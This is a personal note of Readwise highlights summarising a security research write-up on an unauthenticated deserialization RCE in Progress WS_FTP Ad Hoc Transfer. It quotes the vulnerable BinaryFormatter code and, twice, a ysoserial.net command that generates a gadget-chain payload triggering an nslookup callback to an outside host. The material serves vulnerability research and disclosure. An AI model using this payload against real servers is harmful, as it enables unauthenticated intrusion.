---
author: Assetnote
aliases:
  - RCE in Progress WS_FTP Ad Hoc via IIS HTTP Modules
tags:
  - readwise/articles
url: https://blog.assetnote.io/2023/10/04/rce-progress-ws-ftp/
created: 2024-08-20
---
# RCE in Progress WS_FTP Ad Hoc via IIS HTTP Modules

![rw-book-cover](https://blog.assetnote.io/apple-touch-icon-180x180.png)


## Unauthenticated RCE in Progress WS_FTP Ad Hoc Transfer

This report details a critical Remote Code Execution (RCE) vulnerability discovered in the Ad Hoc Transfer component of Progress WS_FTP. The flaw is a classic [dotNET](../../Dev,%20ICT%20&%20Cybersec/Dev,%20scripting%20&%20OS/dotNET.md) insecure [Deserialization](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Insecure%20Deserialization%20&%20Object%20Injection.md) issue that allows attackers to execute arbitrary commands without any authentication.

### Executive Summary

- **Vulnerability Type:** Insecure Deserialization leading to RCE.
    
- **Affected Component:** The entire Ad Hoc Transfer component of Progress WS_FTP.
    
- **Authentication Required:** None (Unauthenticated).
    
- **Root Cause:** Unsafe use of `BinaryFormatter` within an IIS HTTP Module.
    

### Discovery Methodology

The research team used **ILSpy** to decompile the application's source code. They employed a "sink-to-source" methodology: identifying the insecure deserialization sink first, and then tracing the execution path backward to find a reachable, unauthenticated source.

### Technical Details

**The Role of IIS HTTP Modules**

IIS HTTP Modules function similarly to "middleware" in modern web frameworks, allowing developers to execute code at various stages of the HTTP request lifecycle. Because this vulnerability exists within an HTTP module, the malicious payload can be delivered via a simple `GET` request to **any route** within the Ad Hoc Transfer application.

**The Vulnerable Module**

The vulnerability specifically resides in an HTTP Module named `MyFileUpload.UploadModule`.

**Root Cause: Insecure Deserialization**

The module processes user-supplied input by passing a base64-encoded string directly into a vulnerable deserialization function:

```cs
// The vulnerable call
UploadManager.Instance.DeserializeProcessor(result2.Substring(DEFAULT_PARAMS_TAG.Length));

// The underlying insecure method
internal IFileProcessor DeserializeProcessor(string input) { 
    BinaryFormatter binaryFormatter = new BinaryFormatter(); 
    byte[] buffer = Convert.FromBase64String(input); 
    MemoryStream serializationStream = new MemoryStream(buffer); 
    
    // Insecure deserialization of user-controlled input
    SettingsStorageObject settingsStorageObject = (SettingsStorageObject)binaryFormatter.Deserialize(serializationStream);
    // ...
}
```

### Exploitation

Because the application uses the inherently unsafe `BinaryFormatter` to process untrusted data, it is trivial to achieve Remote Code Execution. An attacker can generate a malicious serialized payload using [ysonet](../../Raindrop/GitHub%20-%20irsdlysonet%20Deserialization%20payload%20generator%20for%20a%20variety%20of%20.NET%20formatters.md).

The following command demonstrates how to generate a base64-encoded payload using the `TypeConfuseDelegate` gadget chain to execute a reverse shell or DNS lookup:

Bash

```powershell
./ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd.exe /C nslookup wuui3r1tbpx4pwl6ao5dztkiq9w2ks8h.oastify.com" -o base64
```

## Highlights


> decompiling the source code using ILSpy
> [View Highlight](https://read.readwise.io/read/01hdk9z9qn7ytnnwymb171h9ww)



> vulnerability was found from sink -> source, where we discovered the [Deserialization](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Insecure%20Deserialization%20&%20Object%20Injection.md) sink and worked our way up towards the source.
> [View Highlight](https://read.readwise.io/read/01hdk9zht9s1c30d70e2f3re9m)



> Ultimately, we discovered that the vulnerability could be triggered without any authentication, and it affected the entire Ad Hoc Transfer component of WS_FTP.
> [View Highlight](https://read.readwise.io/read/01hdk9zztqnkkzx1m40faegsvk)



> IIS HTTP Modules allow developers to run code within the lifecycle of a HTTP request. The convention of HTTP modules is similar to "middleware" that you might see in other web application frameworks.
> [View Highlight](https://read.readwise.io/read/01hdka188nh2wccc84b7m61ymt)



> The issue discovered in Progress WS_FTP was within a HTTP Module called MyFileUpload.UploadModule
> [View Highlight](https://read.readwise.io/read/01hdka372kr5drd0cs9xszsh2k)



> UploadManager.Instance.DeserializeProcessor(result2.Substring(DEFAULT_PARAMS_TAG.Length));
> [View Highlight](https://read.readwise.io/read/01hdkadqp16zryrhxv9tpyh4z5)



> internal IFileProcessor DeserializeProcessor(string input)     { BinaryFormatter binaryFormatter = new BinaryFormatter(); byte[] buffer = Convert.FromBase64String(input); MemoryStream serializationStream = new MemoryStream(buffer); SettingsStorageObject settingsStorageObject = (SettingsStorageObject)binaryFormatter.Deserialize(serializationStream);
> [View Highlight](https://read.readwise.io/read/01hdkadxdj4jxck3jq8cztfye9)



> In order to execute arbitrary commands through deserialization, we can use ysoserial.net with the following command:
>  ‍
>  ./ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd.exe /C nslookup wuui3r1tbpx4pwl6ao5dztkiq9w2ks8h.oastify.com" -o base64
> [View Highlight](https://read.readwise.io/read/01hdka9g7acve2wjebdwdb5fyv)



> due to the nature of HTTP Modules, the GET URL can be any of the routes within the Ad Hoc Transfer application.
> [View Highlight](https://read.readwise.io/read/01hdkaay00pdretw6memdnjvnw)



> typical .NET deserialization issue that led to RCE
> [View Highlight](https://read.readwise.io/read/01hdkabnar1shzpg83p6qspfw2)

